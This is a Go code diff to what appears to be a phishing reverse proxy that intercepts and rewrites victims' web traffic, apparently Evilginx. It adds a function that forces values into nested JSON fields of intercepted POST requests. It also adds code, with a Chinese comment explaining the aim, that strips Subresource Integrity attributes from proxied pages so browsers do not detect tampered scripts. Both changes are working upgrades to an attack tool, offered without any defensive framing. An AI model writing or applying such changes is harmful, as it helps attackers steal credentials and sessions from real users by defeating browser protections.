@@ -105,6 +105,24 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	}
 	return newBody, nil
 }
+func SetJSONVariableDeep(body []byte, key string, value interface{}) ([]byte, error) {
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return nil, err
+	}
+
+	keys := strings.Split(key, ".")
+	m := data
+	for i := 0; i < len(keys)-1; i++ {
+		if _, ok := m[keys[i]]; !ok {
+			m[keys[i]] = map[string]interface{}{}
+		}
+		m = m[keys[i]].(map[string]interface{})
+	}
+	m[keys[len(keys)-1]] = value
+
+	return json.Marshal(data)
+}
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
@@ -737,7 +755,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									if ok_search {
 										for _, fp_f := range fp.force {
-											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											body, err = SetJSONVariableDeep(body, fp_f.key, fp_f.value)
 											if err != nil {
 												log.Debug("force_post: got error: %s", err)
 											}
@@ -1147,8 +1165,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
+						
 						body = []byte(removeObfuscatedDots(string(body)))
 					}
+				}
+
+				// 删除 SRI integrity 属性，防止浏览器校验失败（必须在所有处理之后）
+				if stringExists(mime, p.auto_filter_mimes) {
+					re_integrity := regexp.MustCompile(`\s+integrity\s*=\s*["'][^"']*["']`)
+					body = []byte(re_integrity.ReplaceAllString(string(body), ""))
+					re_integrity2 := regexp.MustCompile(`\s+integrity\s*=\s*\S+`)
+					body = []byte(re_integrity2.ReplaceAllString(string(body), ""))
 				}
 
 				if stringExists(mime, []string{"text/html"}) {
